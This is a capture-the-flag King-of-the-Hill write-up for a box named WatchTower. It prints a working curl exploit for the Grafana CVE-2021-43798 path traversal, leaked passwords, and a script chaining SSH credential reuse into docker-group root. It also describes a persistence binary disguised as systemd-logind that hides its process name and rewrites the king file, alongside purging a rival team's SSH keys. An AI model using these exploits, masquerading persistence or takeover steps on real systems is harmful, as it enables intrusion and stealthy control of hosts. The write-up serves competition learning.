# WatchTower

## Summary

The event's first round: a Grafana 8.3.0 instance hidden behind RST ratelimiting fell to the unauthenticated path-traversal bug (CVE-2021-43798), leaking `grafana.ini` — whose SMTP password turned out to be reused by the `watchops` shell account, a docker-group member. That reuse chain gave host root, the round's flags, and the event's first king battle against rival team **PhaZto** of ZAARA. The box also confirmed the event-wide king mechanism (`/root/king.txt`, root-only directory) and most of the doctrine used on every later box.

## Solution

### Step 1 — Hidden surface + file read via CVE-2021-43798

Full surface `22/25/3000/5432/6379` — with 3000 and 6379 **invisible to fast scans** behind RST ratelimiting (only slow, spaced probes reveal them; this became event doctrine). Grafana 8.3.0 on :3000 was vulnerable to the plugin-path traversal:

```bash
curl -s --path-as-is \
  "http://167.71.207.59:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/grafana/grafana.ini"
```

Confirmed reads: `/etc/passwd`, `/etc/grafana/grafana.ini`, `/var/lib/grafana/grafana.db` (downloaded and parsed locally). The ini leaked the Grafana admin password (`Gr4f4na_@dm1n_2024`) and — decisively — the SMTP account `ops@watchtower.legion` password `W@tcht0wer_0ps_2024!`, annotated in a ticket comment (WT-88) as **reused for the `watchops` shell account**.

### Step 2 — Credential reuse → docker-group host root → flags + king

```bash
#!/bin/bash
# WatchTower full chain — traversal read → cred-reuse SSH → docker-group root
T=167.71.207.59
# 1) leak the reused SMTP/watchops password (curl above)
# 2) SSH as watchops (uid 1000; groups: docker, wt-ops) — password W@tcht0wer_0ps_2024!
ssh watchops@$T
# 3) docker group == host root; sweep flags, claim the king
docker run --rm -v /:/mnt alpine chroot /mnt /bin/sh -c \
  'grep -rhoE "Legion{[^}]*}" /root /home /var/lib/grafana 2>/dev/null; printf ThundersFist > /root/king.txt'
```

A second, parallel privesc existed: `/opt/watchtower/collect.sh` (`root:wt-ops 775`) executed by root cron every minute via `/etc/cron.d/watchtower` — writable by the wt-ops group, hence root code execution on a timer. Stefan independently reproduced the entire entry chain the same round, validating the team's Faction-MCP split-attack workflow.

### Step 3 — King battle: first contact with ZAARA

Team **PhaZto** of ZAARA (KoTH platform `koth.apt-labs.xyz`, source IP `190.2.154.234`, root key `ziof@kali`) held the king 05:05–05:14 UTC using:

- ~250 ms guard loops (`/root/legion-guard.sh` style) rewriting the king file,
- a read-only bind mount over the king file to defeat simple writes,
- a **TTY killer** terminating any pts session not originating from their IP.

Our countermeasures (~05:2x UTC) took and held the hill: the hardened kingmaker (`prep/bin/rsyslogd` — static, stripped, XOR-obfuscated handle/path, argv wiped, `prctl` comm spoof) deployed as `/usr/local/sbin/.systemd-logind` masquerading `systemd-logind`, ~1 ms unlock→write→immutable self-heal, started through a docker holder (`metrics-relay`) **plus** the root-cron `collect.sh` for redundancy; the `ziof@kali` key purged from authorized_keys; `PasswordAuthentication no`; a fresh team key (`w0lf@W0lf`) installed for root and watchops. From then on all box interaction used **notty ssh exec only** (never `ssh -t`), because ZAARA's killer ends every foreign interactive session.

## Flag

Three flags captured per the round table; two values preserved in Faction (the web-tier flag at `/var/lib/grafana/fl4g.txt` was read but its value never logged):

```text
Legion{w4tcht0wer_docker_group_root_pwn}      # root tier — docker-group privesc
Legion{w4tcht0wer_cred_reuse_ssh_watchops}    # user tier — credential-reuse SSH
# web tier: /var/lib/grafana/fl4g.txt (read; value not preserved)
King: ThundersFist @ /root/king.txt — retaken from ZAARA ~05:2x UTC and held
```

## Lessons (this round's exports to the whole campaign)

1. **RST ratelimiting hides nonstandard ports** — 3000 and 6379 never appeared in fast scans; always complement with slow spaced probes. Later boxes upgraded this to full burst-blocking, making ≥2.5 s spacing mandatory everywhere.
2. **Credential reuse is the intended chain on these boxes** — service config files (grafana.ini, later deploy.conf, redis keys, git history) hold the shell passwords; read them before touching exploit frameworks.
3. **OpenSSH `PerSourcePenalties`** bans source IPs after failed password attempts — pubkey-first, never brute-force.
4. **notty ssh exec only** — ZAARA's TTY killer defines interaction style on every box they touch.
5. **Masqueraded self-healing kingmakers work** — the `/usr/local/sbin/.systemd-logind` deployment beat a 250 ms guard loop and became the template (later upgraded to quad instances + atomic writes on Pillar).
6. **The official king file is `/root/king.txt`** on a root-only directory — confirmed here, assumed on every later box.
7. Best to know if infrastructure has rate limiting as it hindered us throughout, technically you don't even need `masscan` or `nmap -T5` because a slower scan would've been faster in this case.

## Tools

curl (`--path-as-is` traversal), spaced probes, docker (`-v /:/mnt` chroot), sqlite (grafana.db parsing), the hardened kingmaker pair `prep/bin/{rsyslogd,fattr}`, ssh, Faction MCP (VID-9333500 / VID-839500), OhMyOpenCode orchestration.

## Attribution

**Thunder's Fist (Lakindu Perera)** — traversal discovery, credential-reuse chain, ZAARA countermeasures and king retake. **setf123 (Stefan Shabbir)** — independent reproduction of the full chain the same round. Full record: Faction MCP assessment 2 (VID-9333500, VID-839500).
